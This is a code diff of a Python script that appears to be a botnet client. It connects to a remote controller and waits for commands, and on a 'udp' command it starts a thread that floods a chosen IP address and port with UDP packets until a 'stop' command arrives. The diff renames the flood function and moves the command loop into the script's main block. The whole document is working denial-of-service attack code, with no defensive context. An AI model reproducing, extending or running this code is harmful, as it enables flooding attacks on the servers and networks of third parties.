@@ -16,15 +16,17 @@ def create():
         except:
             print("connection failed!")
 
-def udp_flood(ip, port, message):
-    #global attack
+# starts an attack using UDP
+def udp(ip, port, message):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     while attack == True:
         sock.sendto(message.encode("utf-8"), (ip, port))
 
-def yes():
-    global attack
+######################## FIX ATTACK IN __main___
+
+# runs in the beginning of the program
+if __name__ == "__main__":
     sock = create()
 
     while True:
@@ -38,7 +40,7 @@ def yes():
                     print(command[1])
                 elif command[0] == "udp":
                     attack = True
-                    threading.Thread(target=udp_flood, args=(command[1], command[2], command[3])).start()
+                    threading.Thread(target=udp, args=(command[1], command[2], command[3])).start()
                 elif command[0] == "stop":
                     attack = False
                     print("stoped")
@@ -46,5 +48,3 @@ def yes():
                 pass
         except:
             sock = create()
-
-yes()
